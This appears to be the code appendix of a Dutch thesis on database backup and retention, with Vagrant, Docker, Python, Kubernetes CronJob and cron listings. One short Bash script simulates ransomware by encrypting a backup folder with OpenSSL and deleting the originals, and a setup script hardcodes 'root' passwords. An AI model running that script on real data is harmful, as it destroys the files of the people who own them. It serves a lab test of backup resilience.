\chapter{Vagrantfile}
\label{sec:vagrant}
\begin{lstlisting}
Vagrant.configure("2") do |config|

  # Define the first VM - Primary
  config.vm.define "primary" do |primary|
    primary.vm.box = "ubuntu/jammy64"

    # Network configuration
    primary.vm.network "private_network", ip: "192.168.0.10", virtualbox__intnet: "internal_network"

    # Hardware resources
    primary.vm.provider "virtualbox" do |vb|
      vb.memory = "2048" # 2GB RAM
      vb.cpus = 1        # 1 CPU
    end
  end

  # Define the second VM - Backup
  config.vm.define "backup" do |backup|
    backup.vm.box = "ubuntu/jammy64"

    # Network configuration
    backup.vm.network "private_network", ip: "192.168.0.20", virtualbox__intnet: "internal_network"

    # Hardware resources
    backup.vm.provider "virtualbox" do |vb|
      vb.memory = "2048" # 2GB RAM
      vb.cpus = 1        # 1 CPU
    end
  end

  # Define the third VM - Attacker VM
  config.vm.define "attacker" do |attacker|
    attacker.vm.box = "ubuntu/jammy64"

    # Network configuration
    attacker.vm.network "private_network", ip: "192.168.0.30", virtualbox__intnet: "internal_network"

    # Hardware resources
    attacker.vm.provider "virtualbox" do |vb|
      vb.memory = "1024" # 1GB RAM
      vb.cpus = 1        # 1 CPU
    end
  end

end
\end{lstlisting}
\chapter{Script voor het simuleren van een ransomware-aanval}
\label{sec:bash}
\begin{lstlisting}[language=script, caption={Bash script om een ransomware-aanval na te bootsen}]
#!/bin/bash

BACKUP_DIR="/home/vagrant/backups"

# Ensure the encryption key is set as an environment variable
if [ -z "$ENCRYPTION_KEY" ]; then
  echo "Error: ENCRYPTION_KEY environment variable is not set."
  exit 1
fi

for file in "$BACKUP_DIR"/*; do
  if [ -f "$file" ]; then
    # Encrypt the file using OpenSSL
    if openssl enc -aes-256-cbc -salt -in "$file" -out "${file}.enc" -pass pass:"$ENCRYPTION_KEY" -pb>      echo "Encrypted $file and saved as ${file}.enc"
      rm "$file"
      echo "Original file $file is deleted."
    else
      echo "Error: Could not encrypt $file"
    fi
  fi
done
\end{lstlisting}

\chapter{Dockerfile}
\label{sec:dockerfile}
\begin{lstlisting}[language=Dockerfile, caption={Dockerfile gebruikt voor de images van de Kubernetes pods in de POC.}]
FROM ubuntu:latest

RUN apt update -y \
&& apt -y install mysql-client postgresql-client nano \
&& apt install -y python3

COPY src/* /

CMD ["tail", "-f", "/dev/null"]
\end{lstlisting}
\begin{lstlisting}[language=Dockerfile, caption={Dockerfile gebruikt voor het veranderen naar Kubernetes.}]
FROM ubuntu:latest

WORKDIR /src

USER root
RUN apt update -y \
    && apt -y install mysql-client postgresql-client cron nano \
    && apt install -y python3

COPY src/* /src/
COPY crontab.txt /etc/cron.d/my-cron-job
COPY src/setup.sh /src/setup.sh

RUN chmod 0644 /etc/cron.d/my-cron-job && \
    chmod +x /src/backup_script.py
RUN chmod +x /src/setup.sh

ENTRYPOINT ["tail"]
CMD ["-f", "/dev/null"]

\end{lstlisting}

\chapter{Python-script}
\label{sec:python}
\begin{lstlisting}[language=script, caption={Python-script voor back-ups en retentiebeleid.}]
import datetime
import os
import subprocess  # nosec
import argparse
import logging


class Backup:

    def __init__(self, database_name, database_user, type, backup_dir):
        timestr = datetime.datetime.now().strftime('%Y-%m-%d')
        self.filename = f'backup-{type}-{timestr}-{database_name}.dump'
        self.database_name = database_name
        self.database_user = database_user
        self.type = type
        self.password = None
        self.backup_dir = backup_dir
        self.hostname_mysql = os.environ.get("HOSTNAME_MYSQL", "192.168.1.53")
        self.hostname_psql = os.environ.get("HOSTNAME_PSQL", "192.168.1.53")
        self.port_mysql = os.environ.get("PORT_MYSQL", "3306")
        self.port_psql = os.environ.get("PORT_PSQL", "5432")

    def set_password(self):
        """
        Retrieve the database password from an environment variable.
        """
        self.password = os.environ.get("DB_PASSWORD")
        if not self.password:
            logging.warning("Database password not set. Please provide the DB_PASSWORD environment variable.")
            exit(1)

    def create_backup(self, type):
        """
        Create a backup of the database.
        """
        # Ensure the backup directory exists
        if not os.path.exists(self.backup_dir):
            os.makedirs(self.backup_dir)

        # Prepend the backup directory to the filename
        full_path = os.path.join(self.backup_dir, self.filename)

        if type == "MYSQL":
            try:
                cmd = [
                    'mysqldump',
                    '--single-transaction',
                    '-u', self.database_user,
                    f'-p{self.password}',
                    '-h', self.hostname_mysql,
                    '-P', str(self.port_mysql),
                    '--no-tablespaces',
                    '-B', self.database_name,
                ]

                with open(full_path, 'w') as backup_file:
                    result = subprocess.run(cmd, stdout=backup_file, check=True)  # nosec

                if result.returncode != 0:
                    logging.warning(f'Command failed. Return code: {result.returncode}')
                    exit(1)

                return full_path

            except Exception as e:
                logging.warning(e)
                exit(1)

        elif type == "PSQL":
            try:
                cmd = [
                    'pg_dump',
                    '-U', self.database_user,
                    '-h', self.hostname_psql,
                    '-p', str(self.port_psql),
                    '-F', 'c',
                    '-f', full_path,
                    self.database_name
                ]

                result = subprocess.run(cmd, check=True)  # nosec

                if result.returncode != 0:
                    logging.warning(f'Command failed. Return code: {result.returncode}')
                    exit(1)

                return full_path

            except Exception as e:
                logging.warning(e)
                exit(1)

    @staticmethod
    def delete_old_backups(directory, retention_days):
        """
        Deletes backup files older than the specified retention period.
        """
        now = datetime.datetime.now()
        logging.info(f"Starting cleanup of backups in {directory} with retention period: {retention_days} days")
        for file in os.listdir(directory):
            if file.startswith("backup-") and file.endswith(".dump"):
                file_path = os.path.join(directory, file)
                file_mtime = datetime.datetime.fromtimestamp(os.path.getmtime(file_path))
                age = (now - file_mtime).days
                logging.info(f"Checking file {file_path}: age = {age} days")
                if age >= retention_days:
                    try:
                        os.remove(file_path)
                        logging.info(f"Deleted old backup: {file_path}")
                    except Exception as e:
                        logging.warning(f"Failed to delete {file_path}: {e}")
                else:
                    logging.info(f"File {file_path} is not old enough to delete (age = {age} days).")


def main():
    # Configure logging
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(levelname)s - %(message)s"
    )

    parser = argparse.ArgumentParser(description="Execute a local backup of a database.")
    parser.add_argument("-dn", "--database_name", required=True, help="Enter the name of the database for the backup.")
    parser.add_argument("-du", "--database_user", required=True, help="Enter the username of the database for the backup.")
    parser.add_argument("-b", "--backup", action="store_true", help="Backup the database.")
    parser.add_argument("-t", "--type", choices=["MYSQL", "PSQL"], required=True, help="MYSQL or PSQL")
    parser.add_argument("-bd", "--backup_dir", default=".", help="Directory where backups are stored.")
    parser.add_argument("-r", "--retention", type=int, help="Retention period in days for keeping backups.")
    args = parser.parse_args()

    db_name = args.database_name
    db_user = args.database_user
    backup = args.backup
    type = args.type
    backup_dir = args.backup_dir
    retention = args.retention

    if backup:
        b = Backup(db_name, db_user, type, backup_dir)
        try:
            b.set_password()
            backup_file = b.create_backup(type=type)
        except Exception as e:
            logging.warning(e)
        else:
            logging.info(f"Backup successful: {backup_file}")

    if retention is not None:
        try:
            Backup.delete_old_backups(directory=backup_dir, retention_days=retention)
            logging.info(f"Old backups older than {retention} days were successfully deleted from {backup_dir}.")
        except Exception as e:
            logging.warning(f"Failed to clean up old backups: {e}")


if __name__ == '__main__':
    main()
\end{lstlisting}
\chapter{Kubernetes Cronjobs}
\label{sec:cron}
\begin{lstlisting}[language=YAML, caption={YAML-bestand voor de configuratie van de Kubernetes CronJob die een back-up neemt van de MySQL databank.}]
apiVersion: batch/v1
kind: CronJob
metadata:
  name: backup-mysql-cronjob
spec:
  schedule: "0 2 * * *"  
  jobTemplate:
    spec:
      ttlSecondsAfterFinished: 3600  
      template:
        spec:
          containers:
          - name: backup-mysql-container
            image: bouzewazi/ubu4
            command: 
              - "python3"
              - "/backup_script.py"
              - "-dn"
              - "testdb"
              - "-du"
              - "root"
              - "-t"
              - "MYSQL"
              - "-b"
              - "-bd"
              - "/data"
            volumeMounts:
              - name: backup-storage
                mountPath: /data  
            env:
              - name: DB_PASSWORD
                valueFrom:
                  secretKeyRef:
                    name: db-secret
                    key: DB_PASSWORD

            resources:
              requests:
                memory: "1Gi"  
                cpu: "250m"      
              limits:
                memory: "2Gi"  
                cpu: "500m"      
          restartPolicy: OnFailure
          volumes:
          - name: backup-storage
            persistentVolumeClaim:
              claimName: backup-pvc

\end{lstlisting}

\begin{lstlisting}[language=YAML, caption={YAML-bestand voor de configuratie van de Kubernetes CronJob die een back-up neemt van de PostgreSQL databank.}]
apiVersion: batch/v1
kind: CronJob
metadata:
  name: backup-psql-cronjob
spec:
  schedule: "0 2 * * *"  
  jobTemplate:
    spec:
      ttlSecondsAfterFinished: 3600  
      template:
        spec:
          containers:
          - name: backup-mysql-container
            image: bouzewazi/ubu4
            command: 
              - "python3"
              - "/backup_script.py"
              - "-dn"
              - "testdb"
              - "-du"
              - "root"
              - "-t"
              - "PSQL"
              - "-b"
              - "-bd"
              - "/data"
            volumeMounts:
              - name: backup-storage
                mountPath: /data  
            env:
              - name: DB_PASSWORD
                valueFrom:
                  secretKeyRef:
                    name: db-secret
                    key: DB_PASSWORD
              - name: PGPASSWORD
                valueFrom:
                  secretKeyRef:
                    name: db-secret2
                    key: PGPASSWORD

            resources:
              requests:
                memory: "1Gi"  
                cpu: "250m"      
              limits:
                memory: "2Gi"  
                cpu: "500m"      
          restartPolicy: OnFailure
          volumes:
          - name: backup-storage
            persistentVolumeClaim:
              claimName: backup-pvc
\end{lstlisting}

\begin{lstlisting}[language=YAML, caption={YAML-bestand voor de configuratie van de Kubernetes CronJob die oude back-ups verwijdert volgens het retentiebeleid.}, label={lst:cronDel}]
apiVersion: batch/v1
kind: CronJob
metadata:
  name: delete-cronjob
spec:
  schedule: "0 2 * * *"  
  jobTemplate:
    spec:
      ttlSecondsAfterFinished: 3600  
      template:
        spec:
          containers:
          - name: backup-mysql-container
            image: bouzewazi/ubu4
            command: 
              - "python3"
              - "/backup_script.py"
              - "-dn"
              - "testdb"
              - "-du"
              - "root"
              - "-t"
              - "MYSQL"
              - "-r"
              - "14"
              - "-bd"
              - "/data"
            volumeMounts:
              - name: backup-storage
                mountPath: /data  
            env:
              - name: DB_PASSWORD
                valueFrom:
                  secretKeyRef:
                    name: db-secret
                    key: DB_PASSWORD

            resources:
              requests:
                memory: "1Gi"  
                cpu: "250m"      
              limits:
                memory: "2Gi"  
                cpu: "500m"      
          restartPolicy: OnFailure
          volumes:
          - name: backup-storage
            persistentVolumeClaim:
              claimName: backup-pvc
\end{lstlisting}
\chapter{Persistent Volume (PV) voor back-upopslag en bijbehorende Persistent Volume Claim (PVC) in de POC}
\label{sec:pv}
\begin{lstlisting}[language=YAML, caption={YAML-bestand voor de configuratie van het Persistent Volume (PV) dat opslag biedt voor de databaseback-ups in Kubernetes.}]
apiVersion: v1
kind: PersistentVolume
metadata:
  name: backup-pv
spec:
  capacity:
    storage: 5Gi
  accessModes:
    - ReadWriteOnce
  persistentVolumeReclaimPolicy: Retain
  storageClassName: ""  
  hostPath:
    path: "/data"  

\end{lstlisting}

\begin{lstlisting}[language=YAML, caption={YAML-bestand voor de configuratie van de Persistent Volume Claim (PVC).}]
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: backup-pvc
spec:
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 5Gi
  storageClassName: ""

\end{lstlisting}
\chapter{Setup script voor Docker-container}
\label{sec:setup}
\begin{lstlisting}[language=YAML, caption={Bash-script om de cronjobs op te zetten.}]
#!/bin/bash
service cron start

mkdir -p /src/backups

# Voeg cronjobs toe
crontab - <<EOF
* * * * * DB_PASSWORD=root PGPASSWORD=root python3 /src/backup_script.py -dn testdb -du root -t MYSQL -b -bd /src/backups >> /var/log/cron.log 2>&1
* * * * * DB_PASSWORD=root PGPASSWORD=root python3 /src/backup_script.py -dn testdb -du root -t PSQL -b -bd /src/backups >> /var/log/cron.log 2>&1
0 2 * * * DB_PASSWORD=root PGPASSWORD=root python3 /src/backup_script.py -bd /src/backups -r 14 -dn testdb -du root -t MYSQL >> /var/log/cron.log 2>&1
EOF

exec "$@"
\end{lstlisting}

